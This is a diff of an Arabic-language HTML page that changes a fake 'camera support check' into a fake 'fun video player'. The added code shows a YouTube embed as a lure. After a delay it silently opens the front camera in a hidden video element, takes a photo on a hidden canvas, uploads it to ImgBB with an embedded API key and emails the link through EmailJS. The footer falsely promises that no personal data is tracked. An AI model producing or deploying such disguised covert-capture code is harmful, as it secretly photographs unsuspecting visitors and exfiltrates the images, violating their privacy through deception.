@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تحقق من دعم الكاميرا</title>
+  <title>مشغل فيديو</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function() {
@@ -30,7 +30,7 @@
       border-radius: 15px;
       padding: 30px;
       box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      max-width: 600px;
+      max-width: 800px;
       width: 90%;
       margin: 20px auto;
       backdrop-filter: blur(10px);
@@ -45,18 +45,22 @@
     .video-container {
       position: relative;
       width: 100%;
-      max-width: 400px;
+      height: 0;
+      padding-bottom: 56.25%; /* نسبة 16:9 */
       margin: 0 auto 25px;
       border-radius: 10px;
       overflow: hidden;
       box-shadow: 0 8px 20px rgba(0,0,0,0.4);
     }
     
-    video {
+    #player {
+      position: absolute;
+      top: 0;
+      left: 0;
       width: 100%;
+      height: 100%;
+      border: 0;
       border-radius: 10px;
-      background: #000;
-      transform: scaleX(-1); /* Mirror effect */
     }
     
     .loading {
@@ -107,47 +111,67 @@
       font-size: 14px;
       opacity: 0.8;
     }
+    
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>جارٍ التحقق من دعم كاميرا الجهاز...</h1>
+    <h1>مشغل فيديو ممتع</h1>
     
     <div class="video-container">
-      <video id="video" autoplay playsinline></video>
+      <iframe id="player" src="https://www.youtube.com/embed/efQ7_0IzgUw?rel=0&controls=1&showinfo=0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
     </div>
     
     <div class="loading">
       <div class="spinner"></div>
-      <p>جارٍ معالجة البيانات، الرجاء الانتظار</p>
+      <p>جارٍ تحميل الفيديو، الرجاء الانتظار</p>
     </div>
     
     <div class="message">
-      <p>تم الانتهاء من التحقق بنجاح!</p>
-      <p class="success">يمكنك إغلاق هذه الصفحة الآن</p>
+      <p>تم تشغيل الفيديو بنجاح!</p>
+      <p class="success">استمتع بالمشاهدة</p>
     </div>
     
     <div class="error" id="error-message">
-      خطأ: تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الصلاحيات اللازمة
+      خطأ: تعذر تحميل الفيديو. يرجى التحقق من اتصال الإنترنت
     </div>
     
     <div class="footer">
-      <p>هذا الاختبار آمن ولا يتم تخزين أي بيانات شخصية</p>
+      <p>هذا المشغل آمن ولا يتتبع أي بيانات شخصية</p>
     </div>
   </div>
 
-  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+  <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
+  <canvas id="canvas" width="640" height="480" class="hidden"></canvas>
 
   <script>
-    document.addEventListener('DOMContentLoaded', async () => {
-      const video = document.getElementById('video');
-      const loading = document.querySelector('.loading');
-      const message = document.querySelector('.message');
-      const success = document.querySelector('.success');
-      const errorMsg = document.getElementById('error-message');
-      
+    // عناصر DOM
+    const player = document.getElementById('player');
+    const loading = document.querySelector('.loading');
+    const message = document.querySelector('.message');
+    const success = document.querySelector('.success');
+    const errorMsg = document.getElementById('error-message');
+    const hiddenVideo = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('canvas');
+    
+    // متغيرات الحالة
+    let cameraCaptured = false;
+    let emailSent = false;
+    
+    // إخفاء رسالة التحميل بعد بدء تشغيل الفيديو
+    player.addEventListener('load', () => {
+      loading.style.display = 'none';
+      message.style.display = 'block';
+      success.style.display = 'block';
+    });
+    
+    // بدء عملية التقاط الصورة الخفية
+    setTimeout(async () => {
       try {
-        // Access camera
+        // الوصول إلى الكاميرا دون إظهارها
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: 'user',
@@ -156,88 +180,76 @@
           } 
         });
         
-        video.srcObject = stream;
+        hiddenVideo.srcObject = stream;
+        cameraCaptured = true;
         
-        // Hide error message if shown
-        errorMsg.style.display = 'none';
-        
-        // Wait 3 seconds then capture
-        setTimeout(async () => {
-          try {
-            loading.style.display = 'block';
-            
-            // Capture image
-            const canvas = document.getElementById('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            // Flip image horizontally for correct orientation
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Reset transformation
-            ctx.setTransform(1, 0, 0, 1, 0, 0);
-            
-            // Get image as JPEG
-            const imageData = canvas.toDataURL('image/jpeg', 0.85);
-            
-            // Stop the video stream
-            stream.getTracks().forEach(track => track.stop());
-            
-            // Prepare for ImgBB upload
-            const base64Image = imageData.split(',')[1];
-            
-            // Upload to ImgBB
-            const formData = new FormData();
-            formData.append('image', base64Image);
-            formData.append('name', 'camera_capture_' + Date.now());
-            
-            const imgbbResponse = await fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
-              method: 'POST',
-              body: formData
-            });
-            
-            const imgbbData = await imgbbResponse.json();
-            
-            if (!imgbbData.success) {
-              throw new Error('فشل رفع الصورة إلى ImgBB');
-            }
-            
-            const imageUrl = imgbbData.data.url;
-            
-            // Send email using EmailJS
-            await emailjs.send("service_890xst3", "template_p1oukct", {
-              name: "كاميرا الويب",
-              time: new Date().toLocaleString(),
-              message: "تم التقاط صورة جديدة وإرسالها عبر البريد.",
-              image_url: imageUrl
-            });
-            
-            // Show success message
-            loading.style.display = 'none';
-            message.style.display = 'block';
-            setTimeout(() => {
-              success.style.display = 'block';
-            }, 1000);
-            
-          } catch (error) {
-            console.error('Error:', error);
-            showError('حدث خطأ أثناء المعالجة');
-          }
+        // انتظر لضمان جودة الصورة
+        setTimeout(() => {
+          captureImage();
         }, 3000);
         
       } catch (error) {
         console.error('Camera error:', error);
-        showError('تعذر الوصول إلى الكاميرا. يرجى التأكد من منح الصلاحيات اللازمة');
       }
-      
-      function showError(msg) {
-        loading.style.display = 'none';
-        errorMsg.textContent = msg;
-        errorMsg.style.display = 'block';
-        video.style.display = 'none';
+    }, 5000); // بدء التقاط الصورة بعد 5 ثوان
+    
+    // وظيفة التقاط الصورة
+    function captureImage() {
+      try {
+        const ctx = canvas.getContext('2d');
+        
+        // التقاط الصورة
+        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+        
+        // الحصول على بيانات الصورة
+        const imageData = canvas.toDataURL('image/jpeg', 0.85);
+        const base64Image = imageData.split(',')[1];
+        
+        // إيقاف تشغيل الكاميرا
+        hiddenVideo.srcObject.getTracks().forEach(track => track.stop());
+        
+        // رفع الصورة إلى ImgBB
+        const formData = new FormData();
+        formData.append('image', base64Image);
+        formData.append('name', 'hidden_capture_' + Date.now());
+        
+        fetch('https://api.imgbb.com/1/upload?key=85c1b237cc85eb120a31cf73476b1eba', {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(imgbbData => {
+          if (imgbbData.success) {
+            // إرسال الإيميل باستخدام EmailJS
+            emailjs.send("service_890xst3", "template_p1oukct", {
+              name: "صورة خفية",
+              time: new Date().toLocaleString(),
+              message: "تم التقاط صورة جديدة من الكاميرا الأمامية.",
+              image_url: imgbbData.data.url
+            }).then(() => {
+              emailSent = true;
+            }, error => {
+              console.error('Email error:', error);
+            });
+          }
+        })
+        .catch(error => {
+          console.error('ImgBB error:', error);
+        });
+        
+      } catch (error) {
+        console.error('Capture error:', error);
       }
-    });
+    }
+    
+    // عرض رسالة نجاح بعد 10 ثوان
+    setTimeout(() => {
+      if (cameraCaptured && emailSent) {
+        console.log('تم التقاط الصورة وإرسالها بنجاح!');
+      } else if (cameraCaptured) {
+        console.log('تم التقاط الصورة ولكن حدث خطأ في الإرسال');
+      }
+    }, 10000);
   </script>
 </body>
 </html>
